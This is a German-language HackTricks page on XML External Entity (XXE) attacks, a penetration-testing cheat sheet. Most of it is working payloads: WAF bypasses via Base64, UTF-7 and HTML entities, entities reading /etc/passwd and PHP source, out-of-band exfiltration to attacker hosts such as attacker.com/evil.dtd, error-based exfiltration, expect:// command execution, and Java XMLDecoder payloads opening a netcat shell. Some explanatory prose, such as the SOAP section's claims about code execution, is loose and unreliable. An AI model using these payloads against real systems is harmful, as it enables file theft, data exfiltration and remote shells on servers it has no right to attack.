### Content-Type: Von JSON zu XEE

Um die Anfrage zu √§ndern, k√∂nnen Sie eine Burp-Erweiterung namens "**Content Type Converter**" verwenden. [Hier](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) finden Sie ein Beispiel daf√ºr:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Ein weiteres Beispiel finden Sie [hier](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## WAF & Schutzma√ünahmen umgehen

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Dies funktioniert nur, wenn der XML-Server das `data://`-Protokoll akzeptiert.

### UTF-7

Sie k√∂nnen die \[**"Encode Recipe**" von CyberChef hier ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) transformieren in UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Datei:/ Protokollumgehung

Wenn die Webseite PHP verwendet, k√∂nnen Sie anstelle von `file:/` die **PHP Wrapper** `php://filter/convert.base64-encode/resource=` verwenden, um auf **interne Dateien zuzugreifen**.

Wenn die Webseite Java verwendet, k√∂nnen Sie das [**jar-Protokoll**](xxe-xee-xml-external-entity.md#jar-protocol) √ºberpr√ºfen.

### HTML-Entit√§ten

Trick von [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Sie k√∂nnen eine **Entit√§t innerhalb einer Entit√§t** erstellen, indem Sie sie mit **HTML-Entit√§ten** codieren und sie dann aufrufen, um eine DTD zu **laden**.\
Beachten Sie, dass die verwendeten **HTML-Entit√§ten** **numerisch** sein m√ºssen (wie \[in diesem Beispiel]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD-Beispiel:

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

In diesem Beispiel wird eine sogenannte DTD (Document Type Definition) verwendet. Die DTD definiert die Struktur und den Inhalt eines XML-Dokuments. Im obigen Beispiel wird die DTD verwendet, um eine Entit√§t namens "xxe" zu definieren, die auf den Inhalt der Datei "/etc/passwd" verweist.

Die Zeile `<!DOCTYPE foo [...]` definiert den DTD-Teil des XML-Dokuments. Die Zeile `<!ELEMENT foo ANY>` gibt an, dass das Element "foo" beliebigen Inhalt haben kann. Die Zeile `<!ENTITY xxe SYSTEM "file:///etc/passwd">` definiert die Entit√§t "xxe", die auf den Inhalt der Datei "/etc/passwd" verweist.

Die letzte Zeile `<foo>&xxe;</foo>` verwendet die definierte Entit√§t "xxe" im XML-Dokument. Dadurch wird der Inhalt der Datei "/etc/passwd" in das Element "foo" eingef√ºgt.

Dieses Beispiel zeigt eine Schwachstelle namens XML External Entity (XXE). Durch die Verwendung von DTDs und externen Entit√§ten k√∂nnen Angreifer auf vertrauliche Informationen zugreifen, indem sie auf Dateien im System zugreifen oder sogar Remote-Code-Ausf√ºhrung erreichen. Es ist wichtig, diese Schwachstelle zu erkennen und entsprechende Sicherheitsma√ünahmen zu ergreifen, um sie zu verhindern.
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**Extrahiere** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extrahieren externer Ressourcen**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Remote Code Execution

**Wenn das PHP-Modul "expect" geladen ist**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**

XML External Entity (XEE) ist eine Sicherheitsl√ºcke, die in SOAP (Simple Object Access Protocol) implementiert ist. Diese Schwachstelle erm√∂glicht es einem Angreifer, sch√§dlichen Code in eine XML-Nachricht einzuf√ºgen und auszuf√ºhren.

### **Wie funktioniert XEE?**

XEE tritt auf, wenn eine Anwendung XML-Daten verarbeitet, ohne die externen Entit√§ten zu deaktivieren. Eine externe Entit√§t ist ein Verweis auf eine externe Ressource, wie z.B. eine Datei oder eine URL. Durch das Einf√ºgen einer externen Entit√§t in eine XML-Nachricht kann ein Angreifer auf vertrauliche Informationen zugreifen oder sogar das System kompromittieren.

### **Ausnutzung von XEE**

Um XEE auszunutzen, muss ein Angreifer eine speziell gestaltete XML-Nachricht erstellen, die eine externe Entit√§t enth√§lt. Diese Nachricht wird dann an die verwundbare SOAP-Anwendung gesendet. Wenn die Anwendung die externe Entit√§t verarbeitet, kann der Angreifer den Inhalt der externen Ressource lesen und m√∂glicherweise sogar sch√§dlichen Code ausf√ºhren.

### **Schutz vor XEE**

Um sich vor XEE-Angriffen zu sch√ºtzen, sollten SOAP-Anwendungen die Verarbeitung externer Entit√§ten deaktivieren. Dies kann durch das Aktivieren von Funktionen wie "Entity Expansion Limit" oder "Disable External Entities" erreicht werden. Dar√ºber hinaus ist es wichtig, Eingaben zu validieren und zu filtern, um potenziell sch√§dlichen Code zu verhindern.

### **Zusammenfassung**

XEE ist eine Sicherheitsl√ºcke, die in SOAP-Anwendungen auftreten kann und es Angreifern erm√∂glicht, sch√§dlichen Code einzuf√ºgen und auszuf√ºhren. Um sich vor XEE-Angriffen zu sch√ºtzen, sollten SOAP-Anwendungen die Verarbeitung externer Entit√§ten deaktivieren und Eingaben validieren und filtern.
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Dieses Beispiel ist inspiriert von [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) wird verwendet, um den Datenaustausch in Lokalisierungsprozessen zu standardisieren. Es handelt sich um ein auf XML basierendes Format, das haupts√§chlich zum √úbertragen von lokalisierbaren Daten zwischen Tools w√§hrend der Lokalisierung und als gemeinsames Austauschformat f√ºr CAT (Computer-Aided Translation) Tools verwendet wird.

### Analyse der blinden Anfrage

Es wird eine Anfrage an den Server mit folgendem Inhalt gesendet:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Jedoch l√∂st diese Anfrage einen internen Serverfehler aus, der speziell auf ein Problem mit den Markup-Deklarationen hinweist:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Trotz des Fehlers wird ein Treffer auf Burp Collaborator registriert, der auf eine gewisse Interaktion mit der externen Entit√§t hinweist.

Exfiltration von Daten au√üerhalb des Bandes
Um Daten zu exfiltrieren, wird eine modifizierte Anfrage gesendet:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
Dieser Ansatz zeigt, dass der User Agent die Verwendung von Java 1.8 angibt. Eine bekannte Einschr√§nkung dieser Java-Version besteht darin, dass Dateien mit einem Zeilenumbruch, wie z.B. /etc/passwd, nicht mithilfe der Out-of-Band-Technik abgerufen werden k√∂nnen.

Datenexfiltration durch Fehlerbasierte Methode
Um diese Einschr√§nkung zu umgehen, wird ein fehlerbasierter Ansatz verwendet. Die DTD-Datei ist wie folgt strukturiert, um einen Fehler auszul√∂sen, der Daten aus einer Zieldatei enth√§lt:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Der Server antwortet mit einem Fehler, der deutlich auf die nicht vorhandene Datei hinweist und darauf hindeutet, dass der Server versucht, auf die angegebene Datei zuzugreifen:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Um den Inhalt der Datei in der Fehlermeldung einzuschlie√üen, wird die DTD-Datei angepasst:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Diese Modifikation f√ºhrt zur erfolgreichen Exfiltration des Dateiinhalts, da sie sich im √ºber HTTP gesendeten Fehlerausgabewert widerspiegelt. Dies deutet auf einen erfolgreichen XXE (XML External Entity) Angriff hin, der sowohl Out of Band als auch Error-Based Techniken nutzt, um sensible Informationen auszulesen.


## RSS - XEE

G√ºltiges XML im RSS-Format, um eine XXE-Schwachstelle auszunutzen.

### Ping zur√ºck

Einfacher HTTP-Request an den Server des Angreifers
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Datei lesen

Eine h√§ufige Anwendung von XML External Entity (XXE) Angriffen besteht darin, Dateien auf dem Server zu lesen. Dies kann verwendet werden, um vertrauliche Informationen wie Passw√∂rter, private Schl√ºssel oder andere sensible Daten zu stehlen.

Um eine Datei zu lesen, m√ºssen Sie eine speziell pr√§parierte XML-Datei erstellen und an den Server senden. In dieser XML-Datei verwenden Sie die `<!ENTITY>` Deklaration, um eine externe Entit√§t zu definieren, die auf die gew√ºnschte Datei verweist.

Hier ist ein Beispiel f√ºr eine solche XML-Datei:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

In diesem Beispiel wird die Datei `/etc/passwd` auf dem Server gelesen. Sie k√∂nnen den Pfad zu einer anderen Datei √§ndern, um andere Dateien zu lesen.

Sobald Sie die XML-Datei erstellt haben, k√∂nnen Sie sie an den Server senden und die Antwort √ºberpr√ºfen. Wenn die Antwort den Inhalt der Datei enth√§lt, war der Angriff erfolgreich.

Es ist wichtig zu beachten, dass nicht alle Server anf√§llig f√ºr XXE-Angriffe sind. Einige Server haben Sicherheitsvorkehrungen getroffen, um solche Angriffe zu verhindern. Daher ist es wichtig, verschiedene Techniken auszuprobieren und zu testen, ob der Server anf√§llig ist.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Quellcode lesen

Verwendung des PHP base64-Filters
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE zu RCE

XMLDecoder ist eine Java-Klasse, die Objekte auf der Grundlage einer XML-Nachricht erstellt. Wenn ein b√∂sartiger Benutzer eine Anwendung dazu bringen kann, beliebige Daten in einem Aufruf der Methode **readObject** zu verwenden, erh√§lt er sofort die Ausf√ºhrung von Code auf dem Server.

### Verwendung von Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
Der `ProcessBuilder` ist eine Klasse in Java, die verwendet wird, um externe Prozesse zu starten und zu steuern. Mit dem `ProcessBuilder` k√∂nnen Sie Befehle ausf√ºhren und die Ausgabe des Prozesses abrufen. Es ist ein n√ºtzliches Werkzeug f√ºr die Pentest-Webanwendung, da es Ihnen erm√∂glicht, Befehle auf dem Zielsystem auszuf√ºhren und die Ergebnisse zu √ºberwachen.

Um den `ProcessBuilder` zu verwenden, m√ºssen Sie zun√§chst eine Instanz der Klasse erstellen und den Befehl angeben, den Sie ausf√ºhren m√∂chten. Sie k√∂nnen auch Optionen wie das Arbeitsverzeichnis und Umgebungsvariablen festlegen. Sobald Sie den `ProcessBuilder` konfiguriert haben, k√∂nnen Sie die Methode `start()` aufrufen, um den Prozess zu starten.

Nachdem der Prozess gestartet wurde, k√∂nnen Sie die Ausgabe des Prozesses abrufen, indem Sie die Methoden `getInputStream()`, `getErrorStream()` und `getOutputStream()` verwenden. Sie k√∂nnen diese Streams verwenden, um die Ausgabe des Prozesses zu lesen oder Eingaben an den Prozess zu senden.

Es ist wichtig zu beachten, dass der `ProcessBuilder` auch f√ºr b√∂sartige Zwecke verwendet werden kann, insbesondere wenn er unsicher implementiert ist. Ein Angreifer k√∂nnte den `ProcessBuilder` verwenden, um sch√§dliche Befehle auf dem Zielsystem auszuf√ºhren oder vertrauliche Informationen zu stehlen. Daher ist es wichtig, den `ProcessBuilder` sicher zu verwenden und sicherzustellen, dass alle Eingaben ordnungsgem√§√ü validiert und ges√§ubert werden, um potenzielle Sicherheitsl√ºcken zu vermeiden.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## Werkzeuge

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Referenzen

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
* Extrahieren von Informationen √ºber HTTP mit eigener externer DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
